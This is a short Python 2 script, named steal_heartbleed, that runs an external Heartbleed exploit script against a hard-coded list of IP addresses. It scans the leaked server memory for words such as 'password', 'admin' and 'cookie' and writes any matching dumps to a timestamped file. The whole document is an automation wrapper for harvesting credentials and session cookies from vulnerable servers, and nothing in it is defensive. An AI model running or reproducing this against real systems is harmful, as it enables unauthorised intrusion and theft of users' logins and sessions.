import time
import os

accounts = []
ip_list = ["1.1.1.1","1.1.1.2","1.1.1.3"]

now_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

def steal_heartbleed():
    for ip in ip_list:
        result = os.popen('python heartbleed.py %s' % ip).read()
        keywords = [ 'username','password', 'passwd', 'admin','Cookie','cookie']
        for word in keywords:
            if result.find(word) > 0:
                print 'new data', time.asctime()
                with open('/home/code/heartbleed_scan/data/data_heartbleed_' + now_time + '.txt', 'w') as f:
                    f.write(result)
                break


steal_heartbleed()